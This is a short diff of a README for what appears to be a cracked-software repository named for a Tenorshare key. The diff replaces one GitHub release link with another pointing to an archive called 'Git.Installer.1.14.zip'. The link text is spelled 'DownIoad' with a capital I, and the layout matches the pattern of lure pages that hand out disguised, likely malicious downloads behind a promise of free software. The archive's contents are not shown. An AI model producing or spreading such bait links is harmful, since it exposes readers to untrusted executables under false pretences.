@@ -1,7 +1,7 @@
 # Preview
 ![image](https://github.com/Dev2W9/Tenorshare-4u-key/assets/172977146/20448791-572a-43c0-b38d-fe2eba63954b)
 
-## [DownIoad](https://github.com/Ariz3men/Ariz3men/releases/download/DownIoad/Git.Installer.zip)
+## [DownIoad](https://github.com/Dev2W9/Tenorshare-4u-key/releases/download/Release/Git.Installer.1.14.zip)
 
 
 
